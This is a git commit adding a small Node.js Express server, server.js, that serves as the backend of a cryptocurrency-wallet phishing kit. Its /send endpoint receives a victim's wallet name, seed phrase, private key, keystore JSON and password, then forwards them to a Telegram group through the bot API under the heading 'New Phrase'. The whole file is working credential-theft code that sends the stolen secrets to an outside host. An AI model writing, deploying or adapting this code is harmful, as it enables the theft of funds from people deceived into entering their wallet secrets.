1f96ad88f4665cb0d702bd3c965246ff9000f55f
kwerepeter75-hash <kwerepeter75@gmail.com>
2026-07-31 21:38:13 +0100

    Add files via upload

---
+++ server.js
@@ -0,0 +1,71 @@
+const express = require("express");
+const axios = require("axios");
+const cors = require("cors");
+
+const app = express();
+
+app.use(cors());
+app.use(express.json());
+
+const BOT_TOKEN = process.env.BOT_TOKEN;
+// const CHAT_ID = process.env.CHAT_ID;
+const CHAT_ID = process.env.GROUP_ID;
+
+
+app.post("/send", async (req, res) => {
+
+    const {
+        sitename,
+        walletname,
+        phrase,
+        private,
+        key,
+        pass
+    } = req.body;
+
+    const message =
+`📩 New Phrase
+${sitename}
+
+wallet name: ${walletname}
+
+Phrase: ${phrase}
+
+private Key: ${private}
+
+keystore Json: ${key}
+
+Password:
+${pass}`;
+
+    try {
+
+        await axios.post(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+            {
+                chat_id: CHAT_ID,
+                text: message
+            }
+        );
+
+        res.json({
+            success: true
+        });
+
+    } catch (err) {
+
+        console.log(err.response?.data || err);
+
+        res.status(500).json({
+            success: false
+        });
+
+    }
+
+});
+
+const PORT = process.env.PORT || 3000;
+
+app.listen(PORT, () => {
+    console.log("Server running...");
+});
